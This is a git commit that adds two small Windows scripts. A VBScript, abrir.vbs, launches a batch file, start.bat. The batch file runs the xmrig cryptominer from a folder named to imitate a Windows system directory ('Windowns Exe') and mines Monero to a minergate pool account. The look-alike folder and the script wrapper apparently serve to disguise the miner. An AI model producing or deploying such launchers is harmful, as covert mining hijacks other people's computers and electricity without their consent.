641062903b9cc98046d8c015e2470428fdf75cf8
ronnersonqueirozbenjamin <49436446+ronnersonqueirozbenjamin@users.noreply.github.com>
2021-02-17 23:26:37 -0300

    Add files via upload

---
+++ abrir.vbs
@@ -0,0 +1,3 @@
+Dim wshShell
+Set wshShell = CreateObject("WScript.Shell")
+wshShell.Run "start.bat", 1, false
---
+++ start.bat
@@ -0,0 +1,5 @@
+@echo off
+cd\
+cd C:\Windowns Exe
+xmrig.exe -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u ronnersonqueirozbenjamin@gmail.com -p x
+pause
